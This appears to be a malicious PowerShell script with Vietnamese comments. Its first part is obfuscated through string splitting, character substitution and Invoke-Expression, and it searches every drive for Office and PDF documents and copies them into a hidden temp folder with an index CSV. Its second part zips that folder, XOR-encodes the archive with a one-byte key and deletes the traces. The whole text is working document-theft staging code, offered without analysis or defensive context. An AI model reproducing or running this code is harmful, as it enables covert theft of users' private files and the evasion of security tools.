 (('X6Mextensions = @(swV.'+'docswV, swV.do'+'cxswV, swV.xlsswV, swV.xlsxswV, swV.pptswV, swV.pptxswV, '+'swV.pd'+'fswV)

X6MdestinationFolder = MziX6Menv:tmpqaw21f64da1e5792c8295b964d159a14491Mzi

if (-not (Test-Path -Path X6MdestinationFolder)) {
    New-Ite'+'m -ItemType Directory -Path X6MdestinationFolder -Force
}

X6Mf'+'ilesInfo = @()

Get-PSDrive -'+'PSProvider FileSystem l9h Select-Object Root l9h ForEach-Object {
    Ge'+'t-ChildItem -Path X6M_.Root -Recurse -ErrorAction SilentlyContinue
} l9h Where-Object'+' '+'{
    X6M_.FullName -notmatch swVC:qawqaw'+'Program Files*l9hC:qawqawWindows*swV
} l9h Whe'+'re-Object {
    X6Mextensions -cont'+'ains X6M_.Extension
} l9h For'+'Each-Object {
    X6MdestinationPath = Join-Path -Path X6MdestinationFolder -ChildPath X6M_.Name
    try {
        Copy-Item X'+'6M_.FullName -Des'+'tination'+' X6MdestinationPath -Force -ErrorAction Stop
        X6MfilesInfo += [PSCustomObject]@{
'+'
            Name          = X6M_.Name
           '+' FullName      = X6'+'M_.FullName
            LastWriteTime = X6M_.LastWriteTim'+'e
            Length        = X6M_.Length
        }
    }
    catch'+' {

    }
}

'+'X6McsvFilePath = Join-Path '+'-Path X6MdestinationFolder -ChildPath swVCopiedFilesIn'+'fo.csv'+'swV
X6MfilesInfo l9h Export-Csv -Path X6McsvFilePath -Encoding Unicode -NoTypeInformation
')  -CRePLACe  ([ChAR]108+[ChAR]57+[ChAR]104),[ChAR]124  -RePLAcE  'qaw',[ChAR]92 -CRePLACe'swV',[ChAR]39  -CRePLACe'X6M',[ChAR]36  -CRePLACe  'Mzi',[ChAR]34) | INvOKe-exPRessiOn

$sourceFolderPath = "$env:tmp\21f64da1e5792c8295b964d159a14491"

# Đường dẫn đến thư mục bạn muốn nén

# Đường dẫn và tên cho tệp ZIP kết quả
$outputZipFilePath = "$env:tmp\21f64da1e5792c8295b964d159a14491.zip"

# Tạo một byte key ngẫu nhiên
$random = New-Object System.Random
$key = $random.Next(0, 256)

# Nén thư mục thành tệp ZIP
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($sourceFolderPath, $outputZipFilePath)

# Đọc tệp ZIP đã nén
$zipBytes = [System.IO.File]::ReadAllBytes($outputZipFilePath)

# Mã hóa tệp ZIP bằng XOR với key
for ($i = 0; $i -lt $zipBytes.Length; $i++) {
    $zipBytes[$i] = $zipBytes[$i] -bxor $key
}

# Tạo tên và đường dẫn cho tệp đã mã hóa
$outputEncryptedFilePath = "$env:tmp\21f64da1e5792c8295b964d159a14491_.zip"

# Ghi tệp đã mã hóa ra file
$stream = [System.IO.File]::Create($outputEncryptedFilePath)
$stream.Write($key, 0, 1)
$stream.Write($zipBytes, 0, $zipBytes.Length)
$stream.Close()

Remove-Item -Path $sourceFolderPath -Recurse -Force
Get-ChildItem -Path $outputZipFilePath | Remove-Item -Force
# Hiển thị thông báo khi hoàn thành
# Write-Host "File đã được nén và mã hóa thành công tại: $outputEncryptedFilePath"